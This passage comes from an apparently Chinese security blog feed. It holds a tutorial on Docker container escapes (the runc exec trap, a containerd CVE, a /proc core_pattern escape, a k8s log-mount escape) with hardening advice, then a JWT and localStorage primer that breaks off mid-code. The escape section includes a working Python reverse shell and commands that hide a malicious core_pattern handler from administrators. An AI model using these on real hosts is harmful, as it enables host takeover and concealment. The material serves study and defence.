&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker cp main 78e0d8daa906:/home&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker exec -it 78e0d8daa906 /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行 main 文件，使用 nc 监听反弹的端口，等待启动 docker&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There are &lt;strong&gt;2&lt;/strong&gt; use cases for the exploit. The first (which is what this repo is), is essentially a trap. An attacker would need to get command execution inside a container and start a malicious binary which would listen. When someone (attacker or victim) uses  &lt;code&gt;docker exec&lt;/code&gt;  to get into the container, this will trigger the exploit which will allow code execution as root.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在另外一个页面，启动 docker，运行 main 的页面会得到返回&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221129110937154.png&#34; alt=&#34;image-20221129110937154&#34;&gt;`&lt;/p&gt;
&lt;p&gt;描述的有些奇怪，可以去上面的 payload 的链接看看，里面有 video&lt;/p&gt;
&lt;p&gt;由于容器服务缺陷导致的逃逸还包括 Docker cp CVE-2019-14271 和 Docker build code execution CVE-2019-13139，利用起来都具有一定的限制条件，具体原理和利用可参考：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnVuaXQ0Mi5wYWxvYWx0b25ldHdvcmtzLmNvbSUyRmRvY2tlci1wYXRjaGVkLXRoZS1tb3N0LXNldmVyZS1jb3B5LXZ1bG5lcmFiaWxpdHktdG8tZGF0ZS13aXRoLWN2ZS0yMDE5LTE0MjcxJTJG&#34;&gt;https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnN0YWFsZHJhYWQuZ2l0aHViLmlvJTJGcG9zdCUyRjIwMTktMDctMTYtY3ZlLTIwMTktMTMxMzktZG9ja2VyLWJ1aWxkJTJG&#34;&gt;https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;8containerd逃逸-cve-2020-15257&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8containerd逃逸-cve-2020-15257&#34;&gt;#&lt;/a&gt; 8.containerd 逃逸 - CVE-2020-15257&lt;/h3&gt;
&lt;p&gt;containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API。当在 docker 使用–net=host 参数启动且与宿主机共享 net namespace 时，docker 容器会暴露 containerd-shim 监听的 Unix 域套接字，攻击者可以绕过访问权限访问 containerd 的控制 API 直接操作 containerd-shim ，来控制容器，从而实现 Docker 容器逃逸。&lt;/p&gt;
&lt;p&gt;exp: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nkay10ZWFtL0NESy9yZWxlYXNlcw==&#34;&gt;https://github.com/cdk-team/CDK/releases&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;9挂载proc导致逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9挂载proc导致逃逸&#34;&gt;#&lt;/a&gt; 9. 挂载 /proc 导致逃逸&lt;/h3&gt;
&lt;p&gt;linux 中的 &lt;code&gt;/proc&lt;/code&gt;  目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。&lt;br&gt;
当 docker 启动时将 &lt;code&gt;/proc&lt;/code&gt;  目录挂载到容器内部时可以实现逃逸。&lt;/p&gt;
&lt;p&gt;通过文档可知， &lt;code&gt;/proc/sys/kernel/core_pattern&lt;/code&gt;  文件是负责进程奔溃时内存数据转储的，当第一个字符是 &lt;code&gt;|&lt;/code&gt;  管道符时，后面的的部分会以命令行的方式进行解析并运行。&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuNS9jb3JlLjUuaHRtbA==&#34;&gt;https://man7.org/linux/man-pages/man5/core.5.html&lt;/span&gt;&lt;br&gt;
 并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。&lt;/p&gt;
&lt;p&gt;由于管道符的原因，错误的数据可能会扰乱我们的命令，因此这里用 python 接受并且忽略错误数据。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#!/usr/bin/python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import  os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lhost = &amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lport = 10000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def main():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   s.connect((lhost, lport))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   os.dup2(s.fileno(), 0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   os.dup2(s.fileno(), 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   os.dup2(s.fileno(), 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   os.putenv(&amp;quot;HISTFILE&amp;quot;, &amp;#x27;/dev/null&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # os.remove(&amp;#x27;/tmp/.x.py&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;quot;__main__&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并且创建一个会抛出段错误的程序&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main(void)  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   int *a  = NULL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   *a = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后在 &lt;code&gt;core_pattern&lt;/code&gt;  文件中写入运行反弹 shell 的命令（这里需要注意由于是以宿主机上的权限运行的，因此 python 的路径则也是 docker 目录的路径）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;host_path=`sed -n &amp;#x27;s/.*\perdir=\([^,]*\).*/\1/p&amp;#x27; /etc/mtab`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;|$host_path/tmp/.x.py \rcore    &amp;quot; &amp;gt;  /host-proc/sys/kernel/core_pattern&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;\r&lt;/code&gt;  之后的内容主要是为了为了管理员通过 &lt;code&gt;cat&lt;/code&gt;  命令查看内容时隐蔽我们写入恶意命令。&lt;br&gt;
这样当我们运行 c 文件之后，就会抛出段错误，然后执行 &lt;code&gt;core_pattern&lt;/code&gt;  中的命令（运行成功 &lt;code&gt;core_pattern&lt;/code&gt;  时会有 &lt;code&gt;core dumped&lt;/code&gt;  的输出）&lt;/p&gt;
&lt;h3 id=&#34;10k8s中挂载varlog&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10k8s中挂载varlog&#34;&gt;#&lt;/a&gt; 10.k8s 中挂载 /var/log&lt;/h3&gt;
&lt;p&gt;这里用单纯的挂载 &lt;code&gt;/var/log&lt;/code&gt;  来形容这个逃逸的触发条件其实不太严谨，需要满足如下条件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;挂载了 &lt;code&gt;/var/log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;容器是在一个 k8s 的环境中&lt;/li&gt;
&lt;li&gt;当前 pod 的 serviceaccount 拥有 get|list|watch log 的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;类似于赋予了当前 pod 一个读取日志的能力。&lt;br&gt;
当满足以上条件时，可以与 node 节点的 10250 端口进行通信，并通过软链接的方式读取 node 上的文件。&lt;/p&gt;
&lt;p&gt;exp:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbHNhZ2kva3ViZS1wb2QtZXNjYXBl&#34;&gt;https://github.com/danielsagi/kube-pod-escape&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;防御docker逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防御docker逃逸&#34;&gt;#&lt;/a&gt; 防御 docker 逃逸&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2、runc版本 &amp;gt; 1.0-rc6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3、k8s 集群版本&amp;gt;1.12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4、Linux内核版本&amp;gt;=2.6.22——CVE-2016-5195(脏牛)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5、Linux内核版本&amp;gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6、不建议以root权限运行Docker服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7、不建议以privileged（特权模式）启动Docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8、不建议将宿主机目录挂载至容器目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，存在容器逃逸风险&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96b25lLmh1b3hpYW4uY24vZC8xMDM0LWRvY2tlci8y&#34;&gt;Docker 实现原理 - 火线 Zone - 云安全社区 (huoxian.cn)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTg3NzI1&#34;&gt;浅析 docker 的多种逃逸方法 - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2luZ2trLmNvbS8yMDIxLzAxLyVFOSU4NSU4RCVFNyVCRCVBRSVFNCVCOCU4RCVFNSVCRCU5MyVFNSVBRiVCQyVFOCU4NyVCNCVFNyU5QSU4NCVFNSVBRSVCOSVFNSU5OSVBOCVFOSU4MCU4MyVFOSU4MCVCOC8=&#34;&gt;配置不当导致的容器逃逸 - Kingkk’s Blog&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m01ly.github.io/2022/01/04/pt-docker-escape/#3-2-%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E4%B8%8D%E5%BD%93&#34;&gt;(&lt;em&gt;´∇｀&lt;/em&gt;)~ docker 逃逸常用方法 | Hexo (m01ly.github.io)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvY29udGFpbmVyLzI0Mjc2My5odG1s&#34;&gt;初识 Docker 逃逸 - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly95eXo5LmNuLzIwMjIvMDMvMjIvZG9ja2VyJUU5JTgwJTgzJUU5JTgwJUI4JUU2JTgwJTlEJUU4JUI3JUFGJUU2JTgwJUJCJUU3JUJCJTkzLw==&#34;&gt;Docker 逃逸思路总结 &amp;amp;&amp;amp; 复现 – yyz の blog (yyz9.cn)&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/</guid>
            <title>JWT</title>
            <link>http://example.com/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/</link>
            <pubDate>Thu, 17 Nov 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;jwt-基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt-基础&#34;&gt;#&lt;/a&gt; JWT 基础&lt;/h1&gt;
&lt;p&gt;JWT （JSON Web Token） 是目前最流行的跨域认证解决方案，是一种基于 Token 的认证授权机制。 从 JWT 的全称可以看出，JWT 本身也是 Token，一种规范化之后的 JSON 结构的 Token。&lt;/p&gt;
&lt;p&gt;JWT 自身包含了身份验证所需要的所有信息，因此，我们的服务器不需要存储 Session 信息。这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。&lt;/p&gt;
&lt;p&gt;可以看出，&lt;strong&gt;JWT 更符合设计 RESTful API 时的「Stateless（无状态）」原则&lt;/strong&gt; 。&lt;/p&gt;
&lt;p&gt;并且， 使用 JWT 认证可以有效避免 CSRF 攻击，因为 JWT 一般是存在在 localStorage 中，使用 JWT 进行身份验证的过程中是不会涉及到 Cookie 的。&lt;/p&gt;
&lt;h2 id=&#34;localstorage与cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#localstorage与cookie&#34;&gt;#&lt;/a&gt; localstorage 与 cookie&lt;/h2&gt;
&lt;p&gt;localStorage 和 sessionStorage 属性允许在浏览器中存储 key/value 对的数据。&lt;/p&gt;
&lt;p&gt;localStorage 用于长久保存整个网站的数据，保存的数据没有过期时间，直到手动去删除。&lt;/p&gt;
&lt;p&gt;localStorage 属性是只读的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提示:&lt;/strong&gt; 如果你只想将数据保存在当前会话中，可以使用 sessionStorage 属性， 该数据对象临时保存同一窗口 (或标签页) 的数据，在关闭窗口或标签页之后将会删除这些数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;localStorage 的优势&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、localStorage 拓展了 cookie 的 4K 限制。&lt;/li&gt;
&lt;li&gt;2、localStorage 会可以将第一次请求的数据直接存储到本地，这个相当于一个 5M 大小的针对于前端页面的数据库，相比于 cookie 可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;localStorage 的局限&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、浏览器的大小不统一，并且在 IE8 以上的 IE 版本才支持 localStorage 这个属性。&lt;/li&gt;
&lt;li&gt;2、目前所有的浏览器中都会把 localStorage 的值类型限定为 string 类型，这个在对我们日常比较常见的 JSON 对象类型需要一些转换。&lt;/li&gt;
&lt;li&gt;3、localStorage 在浏览器的隐私模式下面是不可读取的。&lt;/li&gt;
&lt;li&gt;4、localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡。&lt;/li&gt;
&lt;li&gt;5、localStorage 不能被爬虫抓取到。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;localStorage 与 sessionStorage 的唯一一点区别就是 localStorage 属于永久性存储，而 sessionStorage 属于当会话结束的时候，sessionStorage 中的键值对会被清空。&lt;/p&gt;
&lt;p&gt;localStorage 的使用也是遵循同源策略的，所以不同的网站直接是不能共用相同的 localStorage。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;localStorage 使用&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(！window.localStorage)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alert(&amp;quot;浏览器不支持localstorage&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var storage=window.localStorage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入a字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage[&amp;quot;a&amp;quot;]=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入b字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage.b=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入c字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage.setItem(&amp;quot;c&amp;quot;,3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;a&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;b&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;c&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;localStorage 的读取&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(!window.localStorage)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alert(&amp;quot;浏览器不支持localstorage&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var storage=window.localStorage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入a字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage[&amp;quot;a&amp;quot;]=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入b字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage.b=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //写入c字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    storage.setItem(&amp;quot;c&amp;quot;,3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;a&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;b&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(typeof storage[&amp;quot;c&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //第一种方法读取&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var a=storage.a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //第二种方法读取&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var b=storage[&amp;quot;b&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //第三种方法读取&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var c=storage.getItem(&amp;quot;c&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    console.log(c);&lt;/span&gt;&lt;br&gt;&lt;span 